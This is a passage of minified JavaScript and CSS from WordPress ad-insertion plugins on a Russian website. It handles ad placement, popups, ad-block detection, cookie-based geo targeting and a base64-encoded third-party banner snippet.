+d?(e.css({visibility:""}),e.hasClass("ai-remove-position")&&e.css({position:""}),"undefined"!=typeof a(this).data("code")&&(d=b64d(a(this).data("code")),0!=a(this).closest("head").length?(a(this).after(d),a(this).remove()):a(this).append(d),ai_process_element_lists(this))):g&&!z&&0!=U?(e.css({visibility:""}),e.hasClass("ai-remove-position")&&e.css({position:""}),a(this).next(".ai-fallback").removeClass("ai-fallback"),"undefined"!=typeof a(this).data("fallback-code")?(d=b64d(a(this).data("fallback-code")),
+a(this).append(d),ai_process_element_lists(this)):(a(this).hide(),e.find(".ai-debug-block").length||-1!=e.attr("style").indexOf("height:")||e.hide()),d=e.attr("data-ai"),"undefined"!==typeof d&&!1!==d&&(d=a(this).attr("fallback-tracking"),"undefined"!==typeof d&&!1!==d&&e.attr("data-ai-"+a(this).attr("fallback_level"),d))):(a(this).hide(),e.length&&(e.removeAttr("data-ai").removeClass("ai-track"),e.find(".ai-debug-block").length?(e.css({visibility:""}).removeClass("ai-close"),e.hasClass("ai-remove-position")&&
+e.css({position:""})):-1==e.attr("style").indexOf("height:")&&e.hide()));a(this).attr("data-code","");a(this).attr("data-fallback-code","");e.removeClass("ai-list-block")})}};a(document).ready(function(c){setTimeout(function(){ai_process_lists();setTimeout(function(){H();if("function"==typeof ai_load_blocks){var l=function(G){"cmplzEnableScripts"!=G.type&&"all"!==G.consentLevel||ai_load_blocks()};jQuery(document).on("cmplzEnableScripts",l);jQuery(document).on("cmplz_event_marketing",l)}},50);jQuery(".ai-debug-page-type").dblclick(function(){jQuery("#ai-iab-tcf-status").text("CONSENT COOKIES");
+jQuery("#ai-iab-tcf-bar").show()});jQuery("#ai-iab-tcf-bar").click(function(){k("euconsent-v2");k("__lxG__consent__v2");k("__lxG__consent__v2_daisybit");k("__lxG__consent__v2_gdaisybit");k("CookieLawInfoConsent");k("cookielawinfo-checkbox-advertisement");k("cookielawinfo-checkbox-analytics");k("cookielawinfo-checkbox-necessary");k("complianz_policy_id");k("complianz_consent_status");k("cmplz_marketing");k("cmplz_consent_status");k("cmplz_preferences");k("cmplz_statistics-anonymous");k("cmplz_choice");
+k("cmplz_banner-status");k("cmplz_functional");k("cmplz_policy_id");k("cmplz_statistics");k("moove_gdpr_popup");k("real_cookie_banner-blog:1-tcf");k("real_cookie_banner-blog:1");jQuery("#ai-iab-tcf-status").text("CONSENT COOKIES DELETED")})},5)})});
+function ai_process_element_lists(a){setTimeout(function(){"function"==typeof ai_process_rotations_in_element&&ai_process_rotations_in_element(a);"function"==typeof ai_process_lists&&ai_process_lists(jQuery(".ai-list-data",a));"function"==typeof ai_process_ip_addresses&&ai_process_ip_addresses(jQuery(".ai-ip-data",a));"function"==typeof ai_process_filter_hooks&&ai_process_filter_hooks(jQuery(".ai-filter-check",a));"function"==typeof ai_adb_process_blocks&&ai_adb_process_blocks(a);"function"==typeof ai_process_impressions&&
+1==ai_tracking_finished&&ai_process_impressions();"function"==typeof ai_install_click_trackers&&1==ai_tracking_finished&&ai_install_click_trackers();"function"==typeof ai_install_close_buttons&&ai_install_close_buttons(document)},5)}
+function getAllUrlParams(a){var n=a?a.split("?")[1]:window.location.search.slice(1);a={};if(n){n=n.split("#")[0];n=n.split("&");for(var E=0;E<n.length;E++){var u=n[E].split("="),H=void 0,v=u[0].replace(/\[\d*\]/,function(k){H=k.slice(1,-1);return""});u="undefined"===typeof u[1]?"":u[1];v=v.toLowerCase();u=u.toLowerCase();a[v]?("string"===typeof a[v]&&(a[v]=[a[v]]),"undefined"===typeof H?a[v].push(u):a[v][H]=u):a[v]=u}}return a};
+ai_run_110717617957 = function(){
+ai_document_write=document.write;document.write=function(a){"interactive"==document.readyState?(console.error("document.write called after page load: ",a),"undefined"!=typeof ai_js_errors&&ai_js_errors.push(["document.write called after page load",a,0])):ai_document_write.call(document,a)};
+ai_insert ('before', '.comment-respond', b64d ('PGRpdiBjbGFzcz0nY29kZS1ibG9jayBjb2RlLWJsb2NrLTUnIHN0eWxlPSdtYXJnaW46IDhweCAwOyBjbGVhcjogYm90aDsnPgo8IS0tIEJFR0lOIE90Y2xpY2sgQmFubmVyIG9mZmljZS1ndXJ1IDMwMHgyNTAgKENQQykgKGJhbm5lciktLT4KPGRpdiBpZD0iX210X290X2NvbnRhaW5lcl82NDY1Ij48L2Rpdj4KPHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+CjwhLS0KKGZ1bmN0aW9uKHcpewp2YXIgd2QgPSB3LmRvY3VtZW50Owp3Ll9tdF9ybmQgPSB3Ll9tdF9ybmQgfHwgTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogMTAwMDAwMCk7CncuX210X3JlZmVycmVyID0gdy5fbXRfcmVmZXJyZXIgfHwgZXNjYXBlKHdkLnJlZmVycmVyIHx8ICcnKTsKdHJ5IHsgdy5fbXRfbG9jYXRpb24gPSB3Ll9tdF9sb2NhdGlvbiB8fCBlc2NhcGUody50b3AubG9jYXRpb24uaHJlZikgfQpjYXRjaCAoZSkgeyB3Ll9tdF9sb2NhdGlvbiA9IGVzY2FwZSh3LmxvY2F0aW9uLmhyZWYpIH0Kdy5fTVRfanNMb2FkRGVsYXllZCA9IGZ1bmN0aW9uKGIsYyxkKXt2YXIgYT13ZC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKZCYmKGEuaWQ9ZCk7YS5sYW5ndWFnZT0iamF2YXNjcmlwdCI7YS50eXBlPSJ0ZXh0L2phdmFzY3JpcHQiO2EuY2hhcnNldD0idXRmLTgiO2EuYXN5bmM9MTsKYS5zcmM9YjtpZih3LkFjdGl2ZVhPYmplY3Qpe3ZhciBlPSExO2Eub25sb2FkPWEub25yZWFkeXN0YXRlY2hhbmdlPWZ1bmN0aW9uKCl7CmlmKCFlJiYoIXRoaXMucmVhZHlTdGF0ZXx8dGhpcy5yZWFkeVN0YXRlPT09ImNvbXBsZXRlInx8dGhpcy5yZWFkeVN0YXRlPT09ImxvYWRlZCImJgp0aGlzLm5leHRTaWJsaW5nIT1udWxsKSl7ZT10cnVlO2MmJmMoKTthLm9ubG9hZD1hLm9ucmVhZHlzdGF0ZWNoYW5nZT1udWxsfX19ZWxzZQphLm9ubG9hZD1jO2I9d2QuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInNjcmlwdCIpWzBdO2IucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoYSxiKX07CncuX01UX2pzTG9hZERlbGF5ZWQoJy8vb3RjbGljay1hZHYucnUvY29yZS9jb2RlLmpzP3BpZD02NDY1JnJpZD0nICsgdy5fbXRfcm5kICsgJyZybD0nICsKdy5fbXRfcmVmZXJyZXIgKyAnJmxsPScgKyB3Ll9tdF9sb2NhdGlvbiArICcmb3c9JyArIHcub3V0ZXJXaWR0aCArICcmb2g9JyArIHcub3V0ZXJIZWlnaHQgKwonJnN3PScgKyB3LnNjcmVlbi53aWR0aCArICcmc2g9JyArIHcuc2NyZWVuLmhlaWdodCArICcmcGQ9JyArIHcuc2NyZWVuLnBpeGVsRGVwdGggKyAnJmY9JyArCih3LnRvcCA9PSB3ID8gMCA6IDEpKTsKfSkod2luZG93KQovLyAtLT4KPC9zY3JpcHQ+CjwhLS0gRU5EIE90Y2xpY2sgQmFubmVyIC0tPgo8L2Rpdj4K'));
+};
+if (document.readyState === 'complete' || (document.readyState !== 'loading' && !document.documentElement.doScroll)) ai_run_110717617957 (); else document.addEventListener ('DOMContentLoaded', ai_run_110717617957);
+ai_js_code = true;
+}
+function ai_wait_for_jquery(){function b(f,c){var a=document.createElement("script");a.src=f;var d=document.getElementsByTagName("head")[0],e=!1;a.onload=a.onreadystatechange=function(){e||this.readyState&&"loaded"!=this.readyState&&"complete"!=this.readyState||(e=!0,c&&c(),a.onload=a.onreadystatechange=null,d.removeChild(a))};d.appendChild(a)}window.jQuery&&window.jQuery.fn?ai_run_scripts():(ai_jquery_waiting_counter++,4==ai_jquery_waiting_counter&&b("https://office-guru.ru/wp-includes/js/jquery/jquery.min.js?ver=3.5.1",function(){b("https://office-guru.ru/wp-includes/js/jquery/jquery-migrate.min.js?ver=5.6.8",
+null)}),30>ai_jquery_waiting_counter&&setTimeout(function(){ai_wait_for_jquery()},50))}ai_jquery_waiting_counter=0;ai_wait_for_jquery();
+
+</script>
+<ins id="adsense" class="adsbygoogle" data-tag="flat_pm" style="position:absolute;left:-9999px;top:-9999px">Adblock<br>detector</ins>
+<style>
+.fpm_5_modal{position:fixed;top:50%;left:50%;height:auto;z-index:-2000;visibility:hidden;backface-visibility:hidden;transform:translateX(-50%) translateY(-50%)}
+.fpm_5_modal-show{z-index:2000;visibility:visible}
+.fpm_5_modal-overlay{position:fixed;width:100%;height:100%;visibility:hidden;top:0;left:0;z-index:-1000;opacity:0;background:rgba(0,0,0,.55);transition:opacity .3s ease}
+.fpm_5_modal-show ~ .fpm_5_modal-overlay{z-index:1000;opacity:1;visibility:visible}
+.fpm_5_modal-content{background:#fff;position:relative;transform:translateY(30%);opacity:0;transition:all .3s ease;min-width:200px;min-height:100px}
+.fpm_5_modal-show .fpm_5_modal-content{transform:translateY(0);opacity:1}
+.fpm_5_modal .fpm_5_timer,
+.fpm_5_modal .fpm_5_cross{top:0!important}
+.fpm_5_cross{transition:box-shadow .2s ease;position:absolute;top:-0px;right:0;width:34px;height:34px;background:#000000;display:block;cursor:pointer;z-index:99;border:none;padding:0;min-width:0;min-height:0}
+.fpm_5_cross:hover{box-shadow:0 0 0 50px rgba(0,0,0,.2) inset}
+.fpm_5_cross:after,
+.fpm_5_cross:before{transition:transform .3s ease;content:'';display:block;position:absolute;top:0;left:0;right:0;bottom:0;width:calc(34px / 2);height:3px;background:#ffffff;transform-origin:center;transform:rotate(45deg);margin:auto}
+.fpm_5_cross:before{transform:rotate(-45deg)}
+.fpm_5_cross:hover:after{transform:rotate(225deg)}
+.fpm_5_cross:hover:before{transform:rotate(135deg)}
+.fpm_5_timer{position:absolute;top:-0px;right:0;padding:0 15px;color:#ffffff;background:#000000;line-height:34px;height:34px;text-align:center;font-size:14px;z-index:99}
+.fpm_5_timer span{font-size:16px;font-weight:600}
+.fpm_5_out{transition:transform .3s ease,opacity 0s ease;transition-delay:0s,.3s;position:fixed;min-width:250px;min-height:150px;z-index:9999;opacity:0;-webkit-backface-visibility:hidden}
+.fpm_5_out *{max-width:none!important}
+.fpm_5_out.top .fpm_5_cross{top:auto;bottom:150px}
+.fpm_5_out.show.top .fpm_5_cross{bottom:-0px}
+.fpm_5_out.bottom .fpm_5_cross{top:150px}
+.fpm_5_out.show.bottom .fpm_5_cross{top:-0px}
+.fpm_5_out.right .fpm_5_cross{right:auto;left:0}
+.fpm_5_out.top .fpm_5_timer{top:auto;bottom:150px}
+.fpm_5_out.show.top .fpm_5_timer{bottom:-0px}
+.fpm_5_out.bottom .fpm_5_timer{top:150px}
+.fpm_5_out.show.bottom .fpm_5_timer{top:-0px}
+.fpm_5_out.right .fpm_5_timer{right:auto;left:0}
+.fpm_5_out.top{bottom:100%;left:50%;transform:translateY(0) translateX(-50%);padding-bottom:150px}
+.fpm_5_out.bottom{top:100%;left:50%;transform:translateY(0) translateX(-50%);padding-top:150px}
+.fpm_5_out.left{bottom:0;right:100%;transform:translateX(0);left:auto}
+.fpm_5_out.right{bottom:0;left:100%;transform:translateX(0);right:auto}
+.fpm_5_out.show{transition-delay:0s,0s;opacity:1;min-width:0;min-height:0;background:#fff}
+.fpm_5_out.closed{min-width:0;min-height:0}
+.fpm_5_out.show.top{transform:translateY(100%) translateX(-50%);padding-bottom:0px}
+.fpm_5_out.show.bottom{transform:translateY(-100%) translateX(-50%);padding-top:0px}
+.fpm_5_out.show.left{transform:translateX(100%)}
+.fpm_5_out.show.right{transform:translateX(-100%)}
+.flatpm_fixed{position:fixed;z-index:50}
+.flatpm_stop{position:relative;z-index:50}
+.fpm_5_video{position:relative;overflow:hidden;padding-bottom:56.25%;height:0}
+.fpm_5_video iframe{display:block;width:100%;height:100%;position:absolute}
+.fpm_5_video_flex{display:flex;align-items:center;justify-content:center;position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.65);opacity:0;transition:opacity .35s ease}
+.fpm_5_video_flex.show{opacity:1}
+.fpm_5_video_item{position:relative;max-height:calc(100% - 68px);max-width:calc(100% - 68px);z-index:-1}
+.fpm_5_video_flex.show .fpm_5_video_item{z-index:1}
+.fpm_5_video_flex .fpm_5_timer,
+.fpm_5_video_flex .fpm_5_cross{top:10px!important;right:10px!important}
+.fpm_5_video_item_hover{position:absolute;top:0;left:0;right:0;bottom:0;width:100%;height:100%;cursor:pointer;z-index:2}
+</style>
+<script>var duplicateMode="undefined"!=typeof duplicateFlatPM&&duplicateFlatPM,untilscroll="undefined"!=typeof untilscrollFlatPM?untilscrollFlatPM:".flat_pm_end";document['wr'+'ite']=function(t){var e=document.createElement("div");ff(document.currentScript).after(e),flatPM_setHTML(e,t),ff(e).contents().unwrap()},window.flatPM_sticky=function(t,a,e){var l=t,d=null,s=e=e||0;function n(){if(null==d){for(var t=getComputedStyle(l,""),e="",n=0;n<t.length;n++)0!=t[n].indexOf("overflow")&&0!=t[n].indexOf("padding")&&0!=t[n].indexOf("border")&&0!=t[n].indexOf("outline")&&0!=t[n].indexOf("box-shadow")&&0!=t[n].indexOf("background")||(e+=t[n]+": "+t.getPropertyValue(t[n])+"; ");(d=document.createElement("div")).style.cssText=e+" box-sizing: border-box; width: "+l.offsetWidth+"px;",l.insertBefore(d,l.firstChild);for(var o=l.childNodes.length,n=1;n<o;n++)d.appendChild(l.childNodes[1]);l.style.padding="0",l.style.border="0"}l.style.height=d.getBoundingClientRect().height+"px";var r=l.getBoundingClientRect(),i=Math.round(r.top+d.getBoundingClientRect().height-a.getBoundingClientRect().bottom);r.top-s<=0?r.top-s<=i?(d.className="flatpm_stop",d.style.top=-i+"px"):(d.className="flatpm_fixed",d.style.top=s+"px"):(d.className="",d.style.top=""),window.addEventListener("resize",function(){l.children[0].style.width=getComputedStyle(l,"").width},!1)}window.addEventListener("scroll",n,!1),document.body.addEventListener("scroll",n,!1)},window.flatPM_addDays=function(t,e){var n=60*t.getTimezoneOffset()*1e3,o=t.getTime(),t=new Date;return o+=864e5*e,t.setTime(o),n!=(e=60*t.getTimezoneOffset()*1e3)&&(o+=e-n,t.setTime(o)),t},window.flatPM_adbDetect=function(){var t=document.querySelector('#adsense.adsbygo'+'ogle[data-tag="flat_pm"]');if(!t)return!0;t=t.currentStyle||window.getComputedStyle(t,null),t=parseInt(t.height);return!(!isNaN(t)&&0!=t)},window.flatPM_setCookie=function(t,e,n){var o,r=(n=n||{path:"/"}).expires;"number"==typeof r&&r&&((o=new Date).setTime(o.getTime()+1e3*r),r=n.expires=o),r&&r.toUTCString&&(n.expires=r.toUTCString());var i,a=t+"="+(e=encodeURIComponent(e));for(i in n){a+="; "+i;var l=n[i];!0!==l&&(a+="="+l)}document.cookie=a},window.flatPM_getCookie=function(n){var t=document.cookie.split("; ").reduce(function(t,e){e=e.split("=");return e[0]===n?decodeURIComponent(e[1]):t},"");return""!=t?t:void 0},window.flatPM_testCookie=function(){var t="test_56445";try{return localStorage.setItem(t,t),localStorage.removeItem(t),!0}catch(t){return!1}},window.flatPM_grep=function(t,n,o){return ff.grep(t,function(t,e){return o?e==n:(e+1)%n==0})},window.flatPM_randomString=function(t){for(var e="",n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",o=n.length,r=0;r<t;r++)e+=n.charAt(Math.floor(Math.random()*o));return e},window.flatPM_random=function(t,e){return Math.floor(Math.random()*(e-t+1))+t},window.flatPM_sanitizeUrlParams=function(t){return t&&["__proto__","constructor","prototype"].includes(t.toLowerCase())?t.toUpperCase():t},window.flatPM_getAllUrlParams=function(t){var e={};if(!t||0==t.length)return e;t=(t=flatPM_sanitizeUrlParams(t))?t.split("?")[1]:window.location.search.slice(1);if(t)for(var n=(t=t.split("#")[0]).split("&"),o=0;o<n.length;o++){var r,i=n[o].split("="),a=i[0],l=void 0===i[1]||i[1],a=a.toLowerCase();"string"==typeof l&&(l=l.toLowerCase()),a.match(/\[(\d+)?\]$/)?(e[r=a.replace(/\[(\d+)?\]/,"")]||(e[r]=[]),a.match(/\[\d+\]$/)?(i=/\[(\d+)\]/.exec(a)[1],e[r][i]=l):e[r].push(l)):e[a]?(e[a]&&"string"==typeof e[a]&&(e[a]=[e[a]]),e[a].push(l)):e[a]=l}return e};var ff,flat_body,flat_stack_scripts=[],flat_pm_then=[],flat_date=new Date,flat_titles="h1,h2,h3,h4,h5,h6",flat_dateYear=flat_date.getFullYear(),flat_dateMonth=2==(flat_date.getMonth()+1+"").length?flat_date.getMonth()+1:"0"+(flat_date.getMonth()+1),flat_dateDay=2==(flat_date.getDate()+"").length?flat_date.getDate():"0"+flat_date.getDate(),flat_dateHours=2==(flat_date.getHours()+"").length?flat_date.getHours():"0"+flat_date.getHours(),flat_dateMinutes=2==(flat_date.getMinutes()+"").length?flat_date.getMinutes():"0"+flat_date.getMinutes(),flat_userVars={init:function(){this.testcook=flatPM_testCookie(),this.browser=this.searchString(this.dataBrowser)||!1,this.os=this.searchString(this.dataOS)||!1,this.referer=this.cookieReferer(),this.winwidth=window.innerWidth,this.date=flat_dateYear+"-"+flat_dateMonth+"-"+flat_dateDay,this.time=flat_dateHours+":"+flat_dateMinutes,this.adb=flatPM_adbDetect(),this.until=ff(".flat_pm_start").nextUntil(".flat_pm_end"),this.textlen=this.until.text().replace(/(\s)+/g,"").length,this.titlelen=this.until.find(flat_titles).add(this.until.siblings(flat_titles)).length,this.country=this.cookieData("country"),this.city=this.cookieData("city"),this.ccode=this.cookieData("ccode"),this.role=this.cookieData("role"),this.ip=this.cookieData("ip")},cookieReferer:function(){return parent!==window?"///:iframe":flat_userVars.testcook?(void 0===flatPM_getCookie("flat_r_mb")&&flatPM_setCookie("flat_r_mb",""!=document.referrer?document.referrer:"///:direct"),flatPM_getCookie("flat_r_mb")):""!=document.referrer?document.referrer:"///:direct"},cookieData:function(t){return flat_userVars.testcook&&void 0!==flatPM_getCookie("flat_"+t+"_mb")?flatPM_getCookie("flat_"+t+"_mb"):""},searchString:function(t){for(var e=t.length,o=0;o<e;o++){var a=t[o].str;if(a&&t[o].subStr.test(a))return t[o].id}},dataBrowser:[{str:navigator.userAgent,subStr:/OmniWeb/,ver:"OmniWeb/",id:"OmniWeb"},{str:navigator.userAgent,subStr:/YaBrowser/,id:"YaBrowser"},{str:navigator.vendor,subStr:/Apple/,id:"Safari",ver:"Version"},{str:navigator.userAgent,subStr:/OPR/,id:"Opera",ver:"Version"},{str:navigator.userAgent,subStr:/Firefox/,id:"Firefox"},{str:navigator.userAgent,subStr:/.NET CLR/,id:"Internet Explorer",ver:"MSIE"},{str:navigator.userAgent,subStr:/Edge/,id:"Edge",ver:"rv"},{str:navigator.vendor,subStr:/iCab/,id:"iCab"},{str:navigator.vendor,subStr:/KDE/,id:"Konqueror"},{str:navigator.vendor,subStr:/Camino/,id:"Camino"},{str:navigator.userAgent,subStr:/Netscape/,id:"Netscape"},{str:navigator.userAgent,subStr:/Chrome/,id:"Chrome"},{str:navigator.userAgent,subStr:/Mozilla/,id:"Netscape",ver:"Mozilla"}],dataOS:[{str:navigator.platform,subStr:/Win/,id:"Windows"},{str:navigator.platform,subStr:/Mac/,id:"Mac"},{str:navigator.platform,subStr:/(iPhone|iPad|iPod)/,id:"iPhone"},{str:navigator.platform,subStr:/Linux/,id:"Linux"}]};/zen.yandex/.test(flatPM_getAllUrlParams().utm_referrer)&&(flatPM_setCookie("flat_r_mb","zen.yandex"),flat_userVars.referer="zen.yandex"),window.flatPM_ajax=function(t,e){e=e||[],ff.ajax({type:"POST",url:ajaxUrlFlatPM,dataType:"json",data:{action:"flat_pm_ajax",data_me:{method:t,arr:e}},success:function(t){flat_body.removeClass(t.method),"block_geo_role_ip"===t.method?(flat_userVars.ccode=t.data.ccode,flat_userVars.country=t.data.country,flat_userVars.city=t.data.city,flat_userVars.ip=t.data.ip,flat_userVars.testcook&&(flatPM_setCookie("flat_ccode_mb",t.data.ccode),flatPM_setCookie("flat_country_mb",t.data.country),flatPM_setCookie("flat_city_mb",t.data.city),flatPM_setCookie("flat_ip_mb",t.data.ip),flatPM_setCookie("flat_role_mb",t.data.role)),flatPM_then()):(console.log("ajax error:"),console.error("Метод оказался ошибочным"))},error:function(){console.log("ajax error:"),console.error("Скрипт php вернул ошибку")}})},window.flatPM_then=function(){var t=flat_pm_then.length;if(0!=t){for(var e=0;e<t;e++){var o=flat_pm_then[e];flatPM_next(o)}0<flat_stack_scripts.length&&flatPM_setSCRIPT(flat_stack_scripts)}else flat_pm_then=[]},window.flatPM_persentWrapper=function(t,o,e){var a=0,r=!1;return t.each(function(){var t=ff(this),e=t.clone().find("img, ins, script, style, noscript").remove().end().text().replace(/(\s)+/g,"");if(a+=e.length,o<=a)return r=t,!1}),r},window.flatPM_setWrap=function(t){try{var e,o,a,r,i,l,s,f,n,d=document.createElement("div");d.setAttribute("data-flat-id",t.ID),void 0!==t.how.simple&&("1"==t.how.simple.position&&ff(".flat_pm_start").before(d),"2"==t.how.simple.position&&ff(flat_userVars.until[Math.round(flat_userVars.until.length/2)]).before(d),"3"==t.how.simple.position&&ff(".flat_pm_end").before(d),"4"==t.how.simple.position&&ff(flat_userVars.until[Math.round(flat_userVars.until.length*t.how.simple.fraction.split("/")[0]/t.how.simple.fraction.split("/")[1])]).before(d),"5"==t.how.simple.position&&t.how.simple.fraction<=flat_userVars.textlen&&(!1===(e=flatPM_persentWrapper(flat_userVars.until,t.how.simple.fraction,d))||e.next().is("[data-flat-id]")||e.after(d)),"6"==t.how.simple.position&&(d.setAttribute("data-flat-type","6"),r=flat_userVars.textlen/100*t.how.simple.fraction,e=flatPM_persentWrapper(flat_userVars.until,r,d),(o=!1)!==e&&(a=e.prevAll('[data-flat-type="6"]:first'),r=e.nextAll('[data-flat-type="6"]:first'),0!=a.length&&(console.log(e.prevUntil(a).text().replace(/(\s)+/g,"").length),e.prevUntil(a).text().replace(/(\s)+/g,"").length<t.how.simple.interval&&(o=!0)),0!=r.length&&(console.log(e.nextUntil(r).text().replace(/(\s)+/g,"").length),e.nextUntil(r).text().replace(/(\s)+/g,"").length<t.how.simple.interval&&(o=!0)),o||e.after(d)))),void 0!==t.how.onсe&&(i="true"==t.how.onсe.search_all?ff("html"):flat_userVars.until,l=t.how.onсe.N,s=t.how.onсe.selector,f=t.how.onсe.direction,n=t.how.onсe.before_after,0<(i=i.find(s).add(i.filter(s))).length&&(l="bottom_to_top"==f?i.length-l:l-1,"after"==n&&ff(flatPM_grep(i,l,1)).after(d),"before"==n&&ff(flatPM_grep(i,l,1)).before(d),"append"==n&&ff(flatPM_grep(i,l,1)).append(d),"prepend"==n&&ff(flatPM_grep(i,l,1)).prepend(d))),void 0!==t.how.iterable&&(i="true"==t.how.iterable.search_all?ff("html"):flat_userVars.until,l=t.how.iterable.N,s=t.how.iterable.selector,f=t.how.iterable.direction,n=t.how.iterable.before_after,0<(i=i.find(s).add(i.filter(s))).length&&("bottom_to_top"==f&&(i=i.get().reverse()),"after"==n&&ff(flatPM_grep(i,l,0)).after(d),"before"==n&&ff(flatPM_grep(i,l,0)).before(d),"append"==n&&ff(flatPM_grep(i,l,0)).append(d),"prepend"==n&&ff(flatPM_grep(i,l,0)).prepend(d)))}catch(t){console.warn(t)}},window.flatPM_next=function(a){try{var t=[],e="",o=a.html.length;if(void 0!==a.ip&&"false"==flat_userVars.ip)return void ff('[data-flat-id="'+a.ID+'"]').remove();if(void 0!==a.role&&(void 0!==a.role.role_enabled&&-1==a.role.role_enabled.indexOf(flat_userVars.role)||void 0!==a.role.role_disabled&&-1!=a.role.role_disabled.indexOf(flat_userVars.role)))return void ff('[data-flat-id="'+a.ID+'"]').remove();if(void 0!==a.geo&&(void 0!==a.geo.country_enabled&&-1==a.geo.country_enabled.indexOf(flat_userVars.country)&&-1==a.geo.country_enabled.indexOf(flat_userVars.ccode)||void 0!==a.geo.country_disabled&&(-1!=a.geo.country_disabled.indexOf(flat_userVars.country)||-1!=a.geo.country_disabled.indexOf(flat_userVars.ccode))||void 0!==a.geo.city_enabled&&-1==a.geo.city_enabled.indexOf(flat_userVars.city)||void 0!==a.geo.city_disabled&&-1!=a.geo.city_disabled.indexOf(flat_userVars.city)))return void ff('[data-flat-id="'+a.ID+'"]').remove();for(var r,i,l,s,f=0;f<o;f++)("∞"==a.html[f].res_of||a.html[f].res_of<=flat_userVars.winwidth)&&("∞"==a.html[f].res_to||a.html[f].res_to>flat_userVars.winwidth)&&(void 0!==a.html[f].group?flat_userVars.adb?(null==t["group_"+a.html[f].group]&&(t["group_"+a.html[f].group]=[]),t["group_"+a.html[f].group].push(""==a.html[f].snd&&duplicateMode?a.html[f].fst:a.html[f].snd)):(null==t["group_"+a.html[f].group]&&(t["group_"+a.html[f].group]=[]),t["group_"+a.html[f].group].push(a.html[f].fst)):flat_userVars.adb?t.push(""==a.html[f].snd&&duplicateMode?a.html[f].fst:a.html[f].snd):t.push(a.html[f].fst));for(r in t)e="object"==typeof t[r]?e+"\n"+t[r][flatPM_random(0,t[r].length-1)]:e+"\n"+t[r];if(""==(e=e.replace(/<!-(.*?)->/gm,"").replace(/<!—(.*?)—>/gm,"").trim()))return void ff('[data-flat-id="'+a.ID+'"]').remove();if(void 0===a.how.simple&&void 0===a.how.onсe&&void 0===a.how.iterable||ff('[data-flat-id="'+a.ID+'"]').each(function(){flatPM_setHTML(this,e)}),void 0!==a.how.popup&&(p="true"==a.how.popup.cross?void 0!==a.how.popup.timer&&"true"==a.how.popup.timer?'<div class="fpm_5_timer">Закрыть через <span>'+a.how.popup.timer_count+"</span></div>":'<button class="fpm_5_cross"></button>':"",document.createElement("div"),c=ff(window),b=ff("body"),g=void 0===flatPM_getCookie("flat_modal_"+a.ID+"_mb")||"false"!=flatPM_getCookie("flat_modal_"+a.ID+"_mb"),i="scroll.flatmodal"+a.ID,m="mouseleave.flatmodal"+a.ID+" blur.flatmodal"+a.ID,l=function(){var t,e,o;void 0!==a.how.popup.timer&&"true"==a.how.popup.timer&&(t=ff('.fpm_5_modal[data-id-modal="'+a.ID+'"] .fpm_5_timer span'),e=parseInt(a.how.popup.timer_count),o=setInterval(function(){t.text(--e),e<=0&&(clearInterval(o),t.parent().replaceWith('<button class="fpm_5_cross"></button>'))},1e3))},s=function(){void 0!==a.how.popup.cookie&&"false"==a.how.popup.cookie&&g&&(flatPM_setCookie("flat_modal_"+a.ID+"_mb",!1),ff('.fpm_5_modal[data-id-modal="'+a.ID+'"]').addClass("fpm_5_modal-show"),l()),void 0!==a.how.popup.cookie&&"false"==a.how.popup.cookie||(ff('.fpm_5_modal[data-id-modal="'+a.ID+'"]').addClass("fpm_5_modal-show"),l())},ff("body > *").eq(0).before('<div class="fpm_5_modal" data-flat-id="'+a.ID+'" data-id-modal="'+a.ID+'"><div class="fpm_5_modal-content">'+p+"</div></div>"),w=document.querySelector('.fpm_5_modal[data-id-modal="'+a.ID+'"] .fpm_5_modal-content'),flatPM_setHTML(w,e),"px"==a.how.popup.px_s?(c.bind(i,function(){c.scrollTop()>a.how.popup.after&&(c.unbind(i),b.unbind(m),s())}),void 0!==a.how.popup.close_window&&"true"==a.how.popup.close_window&&b.bind(m,function(){c.unbind(i),b.unbind(m),s()})):(v=setTimeout(function(){b.unbind(m),s()},1e3*a.how.popup.after),void 0!==a.how.popup.close_window&&"true"==a.how.popup.close_window&&b.bind(m,function(){clearTimeout(v),b.unbind(m),s()}))),void 0!==a.how.outgoing){function n(){var t,e,o;void 0!==a.how.outgoing.timer&&"true"==a.how.outgoing.timer&&(t=ff('.fpm_5_out[data-id-out="'+a.ID+'"] .fpm_5_timer span'),e=parseInt(a.how.outgoing.timer_count),o=setInterval(function(){t.text(--e),e<=0&&(clearInterval(o),t.parent().replaceWith('<button class="fpm_5_cross"></button>'))},1e3))}function d(){void 0!==a.how.outgoing.cookie&&"false"==a.how.outgoing.cookie&&g&&(ff('.fpm_5_out[data-id-out="'+a.ID+'"]').addClass("show"),n(),b.on("click",'.fpm_5_out[data-id-out="'+a.ID+'"] .fpm_5_cross',function(){flatPM_setCookie("flat_out_"+a.ID+"_mb",!1)})),void 0!==a.how.outgoing.cookie&&"false"==a.how.outgoing.cookie||(ff('.fpm_5_out[data-id-out="'+a.ID+'"]').addClass("show"),n())}var _,u="0"!=a.how.outgoing.indent?' style="bottom:'+a.how.outgoing.indent+'px"':"",p="true"==a.how.outgoing.cross?void 0!==a.how.outgoing.timer&&"true"==a.how.outgoing.timer?'<div class="fpm_5_timer">Закрыть через <span>'+a.how.outgoing.timer_count+"</span></div>":'<button class="fpm_5_cross"></button>':"",c=ff(window),h="scroll.out"+a.ID,m="mouseleave.outgoing"+a.ID+" blur.outgoing"+a.ID,g=void 0===flatPM_getCookie("flat_out_"+a.ID+"_mb")||"false"!=flatPM_getCookie("flat_out_"+a.ID+"_mb"),b=(document.createElement("div"),ff("body"));switch(a.how.outgoing.whence){case"1":_="top";break;case"2":_="bottom";break;case"3":_="left";break;case"4":_="right"}ff("body > *").eq(0).before('<div class="fpm_5_out '+_+'"'+u+' data-flat-id="'+a.ID+'" data-id-out="'+a.ID+'">'+p+"</div>");var v,w=document.querySelector('.fpm_5_out[data-id-out="'+a.ID+'"]');flatPM_setHTML(w,e),"px"==a.how.outgoing.px_s?(c.bind(h,function(){c.scrollTop()>a.how.outgoing.after&&(c.unbind(h),b.unbind(m),d())}),void 